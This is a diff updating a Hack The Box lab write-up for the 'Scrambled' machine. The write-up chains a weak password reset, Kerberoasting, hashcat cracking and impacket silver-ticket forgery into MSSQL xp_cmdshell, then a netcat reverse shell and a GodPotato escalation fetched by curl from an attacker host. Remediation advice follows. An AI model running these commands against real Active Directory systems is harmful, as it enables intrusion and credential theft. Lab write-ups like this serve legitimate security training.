@@ -12,53 +12,74 @@ tags:
   - kerberos
   - silver-ticket
   - privilege-escalation
+objective: "Chain a weak password reset, Kerberoasting, and silver-ticket forgery into SYSTEM-level control of an Active Directory host."
+tools:
+  - rustscan
+  - feroxbuster
+  - netexec
+  - rusthound-ce
+  - hashcat
+  - impacket
+  - godpotato
+  - netcat
+skill: "Active Directory credential recovery and Kerberos ticket forgery"
+outcome: "Administrative MSSQL access via a forged silver ticket and SYSTEM-level code execution through SeImpersonate abuse"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Active Directory domain controller with SQL Server 2019 exposed |
+| Starting position | Unauthenticated network access |
+| Objective | Chain a weak password reset, Kerberoasting, and silver-ticket forgery into SYSTEM-level control |
+| Outcome | Domain user access, administrative MSSQL access via a forged silver ticket, and SYSTEM-level code execution |
 
 ## Summary
 
-Scrambled is a Medium-rated Hack The Box Windows lab that demonstrates how a weak password‑reset mechanism on an IIS intranet portal can lead to full domain compromise. The recorded chain starts with a password reset that sets a user’s password to their username, uses the recovered credentials to Kerberoast a service account with a weak password, forges a silver ticket against MSSQL, executes commands via `xp_cmdshell`, and escalates to SYSTEM via GodPotato exploiting `SeImpersonatePrivilege`. Every step abuses legitimate functionality that was misconfigured. Credential values, target addresses, and download locations are redacted below; command patterns are preserved.
+Scrambled is a Medium-rated Hack The Box Windows lab that reaches full compromise by abusing a weak password-reset feature and misconfigured Kerberos trust. An IIS intranet portal resets any user's password to their username, the resulting domain account is used to Kerberoast a service account with a weak password, and the cracked password's NTLM hash forges a silver ticket against the MSSQL service. Administrative database access then delivers a payload through `xp_cmdshell`, and GodPotato turns the service account's `SeImpersonatePrivilege` into `SYSTEM`. Credential values, target addresses and hostnames, and download locations are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Weak password reset → SMB credential validation → Kerberoasting `<SERVICE_ACCOUNT>` → silver-ticket forgery → MSSQL `xp_cmdshell` → GodPotato `SeImpersonate` abuse → SYSTEM**
 
 ## Context and Objective
 
-- **Target:** Windows Server 2019 (build 17763), Active Directory Domain Controller (`<DC_FQDN>`)
-- **Services exposed:** DNS (port 53), HTTP/IIS (port 80), Kerberos (port 88), LDAP (389/636/3268/3269), MSSQL (port 1433), WinRM (port 5985), custom API (port 4411)
-- **Objective:** Achieve full compromise through the attack surface presented by the exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Active Directory domain controller (`<DC_FQDN>`), at `<TARGET_IP>` in domain `<DOMAIN>`.
+- **Exposed services:** DNS (53), HTTP/IIS (80), Kerberos (88), LDAP (389/636/3268/3269), SMB (445), MSSQL (1433), a custom API (4411) advertising `SCRAMBLECORP_ORDERS_V1.0.3`, and WinRM (5985).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from the exposed intranet and directory services to administrative and SYSTEM-level control, and demonstrate the impact of misconfigured password handling.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: multiple open TCP services with distinct attack surfaces. Standard AD ports indicate a Domain Controller. IIS hosts an intranet portal. MSSQL is exposed. A custom API service is present.
-
-Action: full TCP scan, then targeted version/script scan of ports 80, 88, 389, 445, 1433, 5985.
+Observation: a fast TCP scan exposes an Active Directory domain controller with several distinct attack surfaces.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Scrambled-TCP
 ```
 
-Representative excerpt (truncated):
+Truncated scan output:
 
 ```text
-PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
 445/tcp  open  microsoft-ds
-1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
+4411/tcp open  found?        SCRAMBLECORP_ORDERS_V1.0.3
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-Technical significance: the host is an AD Domain Controller (<DC_FQDN>). IIS serves an intranet portal. MSSQL is exposed. WinRM is available. The custom API on port 4411 is noted but not used in the recorded chain.
+Significance: the combination of DNS, Kerberos, and LDAP identifies the host as a domain controller. IIS serves an intranet portal, MSSQL is directly exposed, and WinRM is available. The custom API on port 4411 was noted but played no role in the recorded chain.
 
-Result: the recorded output shows AD services, IIS intranet, and MSSQL exposed on a Windows Server 2019 DC.
+Result: the output establishes an AD domain controller exposing an intranet web portal, MSSQL, and WinRM.
 
 ### 2. Web Service Discovery and Password Reset
 
-Observation: directory enumeration on the IIS server reveals `/passwords.html` and `/supportrequest.html`. The `/passwords.html` page states a password reset feature: reset any user’s password to their username.
-
-Action: directory enumeration, then submit a username to trigger reset.
+Observation: directory enumeration on the IIS portal reveals a password-reset endpoint and a support form.
 
 ```bash
 feroxbuster --url http://<DOMAIN> --wordlist <COMMON_WORDLIST>
@@ -69,41 +90,41 @@ http://<TARGET_IP>/passwords.html
 http://<TARGET_IP>/supportrequest.html
 ```
 
+The `/passwords.html` page advertises the reset behavior:
+
 ```text
 leave a message stating your username and we will reset your password to be the same as the username.
 ```
 
-Submitting the username `<LAB_USER>` via the support form resets the password to `<LAB_USER>` (source-reported success).
+Significance: the portal resets any account's password to its username with no verification, so any known username becomes a usable credential.
 
-Result: the notes report valid domain credentials recovered via the weak reset mechanism.
+Result: submitting the username `<LAB_USER>` through the support form produced a credential pair for `<LAB_USER>` that is subsequently validated through SMB.
 
 ### 3. SMB Access and Credential Validation
 
-Observation: reset credentials fit SMB authentication.
-
-Action: validate credentials against SMB.
+Observation: the reset credential can be tested against SMB on the domain controller.
 
 ```bash
 nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' --shares -k
 ```
 
+Authentication succeeds:
+
 ```text
-SMB         <TARGET_IP>    445    DC1              [+] <DOMAIN>\<LAB_USER>:<LAB_USER>
+SMB         <TARGET_IP>    445    <DC_HOST>        [+] <DOMAIN>\<LAB_USER>:<LAB_USER>
 ```
 
-Authentication succeeds. The `Public` SMB share is accessible and contains a PDF document (`Network Security Changes.pdf`). Domain information is collected with RustHound for AD mapping.
+Significance: the weak reset mechanism yields a valid domain user context, giving authenticated access to SMB and other directory-integrated services. The accessible `Public` share holds a PDF document (`Network Security Changes.pdf`), and domain data is collected for attack-path mapping with RustHound-CE.
 
 ```bash
 rusthound-ce --domain <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER>' --zip -o <DOMAIN>
 ```
 
-Result: the notes report domain user access and successful collection of AD data.
+Result: SMB authentication confirms domain user access, and the share and directory data broaden the mapped attack surface.
 
-### 4. Kerberoasting Service Account
+### 4. Kerberoasting the Service Account
 
-Observation: Kerberoasting extracts service account ticket hashes from the domain.
-
-Action: Kerberoast the `sqlsvc` service account.
+Observation: with a domain account, Kerberoasting extracts a service account's TGS hash for offline cracking.
 
 ```bash
 nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' -k --kerberoasting out.txt
@@ -111,49 +132,46 @@ nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' -k --kerberoasting out.txt
 
 ```text
 SAM Account Name:
-sqlsvc
+<SERVICE_ACCOUNT>
 Service Principal Names:
-MSSQLSvc/dc1.<DOMAIN>:1433
-MSSQLSvc/dc1.<DOMAIN>
+MSSQLSvc/<DC_FQDN>:1433
+MSSQLSvc/<DC_FQDN>
 ```
 
-The extracted TGS hash is cracked offline with rockyou:
+The extracted TGS hash is cracked offline against a common wordlist:
 
 ```bash
 hashcat out.txt /wordlists/rockyou.txt -D2
 ```
 
 ```text
-:<WEAK_PASSWORD>
+:<SERVICE_PASSWORD>
 ```
 
-Technical significance: the service account password is weak and found in a common wordlist. The cracked password enables NTLM hash computation for ticket forgery.
+Significance: the `<SERVICE_ACCOUNT>` service account is bound to the MSSQL SPN and uses a weak, dictionary-recoverable password. Recovering it enables NTLM hash computation and ticket forgery against the SQL service.
 
-Result: the notes report the service account password cracked from a Kerberos TGS hash.
+Result: the `<SERVICE_ACCOUNT>` password is recovered from its Kerberos TGS hash.
 
 ### 5. Silver Ticket Forgery and MSSQL Access
 
-Observation: NTLM hash computed from cracked password enables Kerberos ticket forgery.
-
-Action: compute NTLM hash, forge silver ticket against MSSQL service, impersonate `Administrator`.
+Observation: the cracked password yields the NTLM hash needed to forge a Kerberos service ticket.
 
 ```bash
-python3 -c "from Cryptodome.Hash import MD4;h=MD4.new();h.update('<WEAK_PASSWORD>'.encode('utf-16le'));print(h.hexdigest())"
+python3 -c "from Cryptodome.Hash import MD4;h=MD4.new();h.update('<SERVICE_PASSWORD>'.encode('utf-16le'));print(h.hexdigest())"
 ```
 
 ```text
 <NTLM_HASH>
 ```
 
+A silver ticket is forged for the MSSQL SPN, impersonating `Administrator`:
+
 ```bash
-impacket-ticketer -nthash '<NTLM_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/dc1.<DOMAIN>' 'Administrator'
+impacket-ticketer -nthash '<NTLM_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<DC_FQDN>' 'Administrator'
 ```
 
 ```bash
 export KRB5CCNAME=Administrator.ccache
-```
-
-```bash
 impacket-mssqlclient -k <DC_FQDN>
 ```
 
@@ -163,15 +181,13 @@ Inside the SQL session, `xp_cmdshell` is enabled for OS command execution:
 enable_xp_cmdshell
 ```
 
-Technical significance: silver ticket forgery grants administrative access to SQL Server without needing the domain controller’s KRBTGT hash. `xp_cmdshell` provides direct OS command execution.
+Significance: a silver ticket is signed by the service account's key rather than the domain's `KRBTGT` key, so the recovered service password is enough to obtain administrative access to SQL Server without domain-wide forgery. `xp_cmdshell` then exposes direct OS command execution.
 
-Result: the notes report administrative database access via forged Kerberos ticket.
+Result: the forged service ticket grants administrative MSSQL access, and `xp_cmdshell` is enabled in that session.
 
 ### 6. Privilege Escalation via SeImpersonate Abuse
 
-Observation: MSSQL service account holds `SeImpersonatePrivilege`, making it vulnerable to potato‑style privilege escalation.
-
-Action: start listener, deliver reverse shell via `xp_cmdshell`, escalate with GodPotato.
+Observation: the context holding the SQL session has `SeImpersonatePrivilege`, which potato-style tooling can abuse to spawn a `SYSTEM` process.
 
 ```bash
 rlwrap nc -lvnp <LISTEN_PORT>
@@ -181,24 +197,17 @@ rlwrap nc -lvnp <LISTEN_PORT>
 xp_cmdshell powershell -enc <BASE64_PAYLOAD>
 ```
 
-Inspect current user’s privileges:
-
-```text
-whoami /all
-```
+The privilege is confirmed in the resulting session:
 
 ```text
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 ```
 
-Download and execute GodPotato:
+GodPotato is staged and executed to escalate:
 
 ```bash
-curl -o asd.exe http://<ATTACKER>/csharp-files/GodPotato-NET4.exe
-```
-
-```bash
-./asd.exe -cmd "powershell -enc <BASE64_PAYLOAD>"
+curl -o <LOCAL_BINARY> http://<ATTACKER_HOST>/<REMOTE_PATH>
+./<LOCAL_BINARY> -cmd "powershell -enc <BASE64_PAYLOAD>"
 ```
 
 ```text
@@ -207,11 +216,7 @@ curl -o asd.exe http://<ATTACKER>/csharp-files/GodPotato-NET4.exe
 nt authority\system
 ```
 
-Confirm SYSTEM access:
-
-```bash
-whoami /all
-```
+Final context is confirmed:
 
 ```text
 User Name           SID
@@ -219,41 +224,42 @@ User Name           SID
 nt authority\system S-1-5-18
 ```
 
-Technical significance: GodPotato exploits the `SeImpersonatePrivilege` held by the MSSQL service account to spawn a process as `SYSTEM`. The root flag is accessible on the Administrator desktop.
+Significance: `SeImpersonatePrivilege` lets the service account impersonate a higher-integrity token, and GodPotato turns that into a `SYSTEM` process, completing local privilege escalation to the highest integrity level on the host.
 
-Result: the notes report SYSTEM access and root flag acquisition (flag content omitted).
+Result: the `whoami /all` output confirms execution as `NT AUTHORITY\SYSTEM`.
 
 ## Challenges and Decisions
 
-| Challenge | Decision | Rationale |
-|---|---|---|
-| Weak password reset mechanism | Used support form to reset user password to username | No verification required; provided initial domain credentials |
-| Kerberoastable service account with weak password | Kerberoasted `sqlsvc` and cracked offline | Weak password found in rockyou wordlist |
-| Silver ticket forgery against MSSQL | Forged ticket impersonating `Administrator` | Provided administrative database access without KRBTGT hash |
-| SeImpersonate privilege on MSSQL service account | Used GodPotato to escalate to SYSTEM | Standard potato-style escalation for service accounts with SeImpersonate |
+The source records no failed attempts or tradeoffs; the chain followed the documented path.
 
 ## Outcome
 
-The evidence establishes: user-level access via weak password reset; service account credential recovery via Kerberoasting; administrative database access via silver ticket forgery; SYSTEM-level code execution via SeImpersonate abuse. Reverse-shell establishment, GodPotato execution, and flag acquisition are source-reported with the limitations noted above. The custom API on port 4411 played no role in the recorded chain.
-
-**Attack chain:**
-Weak password reset → SMB validation → Kerberoasting → silver ticket forgery → MSSQL xp_cmdshell → SeImpersonate abuse → SYSTEM
+The chain ends with administrative MSSQL access through a forged silver ticket and `SYSTEM`-level code execution on the domain controller, confirmed by the `NT AUTHORITY\SYSTEM` identity output. The reset result, the share and directory collection, and the forged-ticket SQL access are recorded in the notes without captured console output.
 
 ## Lessons and Recommendations
 
-Recommendations below follow the source remediation; none were re-tested during curation.
+The recommendations below follow the source remediation; none was re-tested in the lab.
 
-1. **Require verification for password resets.** Never reset passwords to usernames without email or secondary confirmation. Enforce password complexity on newly reset credentials. (Recommendation.)
-2. **Use strong, randomly generated passwords for service accounts.** Migrate to Group Managed Service Accounts (gMSAs) to eliminate password‑based authentication. (Recommendation.)
-3. **Disable RC4 encryption for Kerberos tickets.** Enable Kerberos Armoring (FAST) and monitor for anomalous TGS requests (event ID 4769). (Recommendation.)
-4. **Run MSSQL under a low‑privileged virtual account or Managed Service Account.** Apply security updates that mitigate potato‑type privilege escalation techniques. (Recommendation.)
-5. **Audit service account permissions.** Limit database administrator privileges to only those accounts that require them. (Lesson grounded in this chain.)
-
-Editorial MITRE view (mapping only, not a source claim): weak password reset, Kerberoasting, silver ticket forgery, xp_cmdshell abuse, SeImpersonate privilege escalation.
+1. **Require verification for password resets.** The portal reset any password to the username with no confirmation, turning a known username into a credential. *Recommendation:* require secondary or e-mail verification before a reset and enforce complexity on the new password.
+2. **Use strong, random passwords for service accounts.** The `<SERVICE_ACCOUNT>` password was recovered from a Kerberos TGS hash because it was a dictionary word. *Recommendation:* migrate service accounts to Group Managed Service Accounts (gMSAs) to remove password-based authentication.
+3. **Harden Kerberos ticket issuance.** The service account's exposed key allowed offline cracking and ticket forgery. *Recommendation:* disable RC4 for Kerberos where possible, enable Kerberos Armoring (FAST), and monitor for anomalous TGS requests (event ID 4769).
+4. **Reduce MSSQL service privileges.** The SQL service account held `SeImpersonatePrivilege`, enabling potato-style escalation. *Recommendation:* run MSSQL under a low-privileged virtual or managed service account and apply security updates that mitigate potato-type escalation.
 
 ## References
 
-- Hack The Box machine **[Scrambled](https://app.hackthebox.com/machines/Scrambled)** (retired lab; no active-instance detail)
-- Microsoft documentation: Windows Kerberos and silver ticket features
-- Impacket toolkit for Kerberos ticket manipulation and MSSQL interaction
-- GodPotato privilege escalation tool for SeImpersonate abuse
+- [Hack The Box — Scrambled](https://app.hackthebox.com/machines/Scrambled)
+- [RustScan](https://github.com/RustScan/RustScan) — fast TCP port scanner
+- [feroxbuster](https://github.com/epi052/feroxbuster) — content discovery
+- [NetExec](https://github.com/Pennyw0rth/NetExec) — SMB and Kerberos operations
+- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) — Active Directory data collection
+- [hashcat](https://hashcat.net/hashcat/) — offline hash cracking
+- [Impacket](https://github.com/fortra/impacket) — `ticketer` and `mssqlclient`
+- [GodPotato](https://github.com/BeichenDream/GodPotato) — `SeImpersonate` escalation
+- [Netcat](https://eternallybored.org/misc/netcat/) — reverse-shell listener
+- [xp_cmdshell (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
+- [Impersonate a client after authentication (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
+- [Group Managed Service Accounts overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
+- [Kerberos authentication overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
+- [What's New in Kerberos Authentication — Kerberos armoring (Microsoft Learn)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831747(v=ws.11))
+- [Event ID 4769 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
+- [Password must meet complexity requirements (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)
